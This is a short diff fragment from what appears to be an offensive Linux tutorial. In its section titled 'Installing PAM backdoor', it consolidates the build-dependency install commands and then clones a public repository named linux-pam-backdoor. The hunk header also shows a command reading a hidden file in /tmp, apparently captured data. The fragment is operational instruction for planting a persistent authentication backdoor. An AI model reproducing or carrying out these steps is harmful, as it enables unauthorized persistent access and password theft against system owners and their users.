@@ -35,9 +35,7 @@ localuser@WORK-ubuntu-dev:~$ sudo cat /tmp/.service_temp_data
 # 2] Installing PAM backdoor
 
 ```bash
-sudo apt install -y autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc -y
-
-sudo apt-get install docbook-xsl docbook-xml xsltproc xmlto git -y
+sudo apt install -y autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev libselinux1-dev libtool libcrypt-dev libxml2-utils make pkg-config sed w3m xsltproc xz-utils gcc docbook-xsl docbook-xml xsltproc xmlto git -y
 
 git clone https://github.com/segmentati0nf4ult/linux-pam-backdoor.git
 
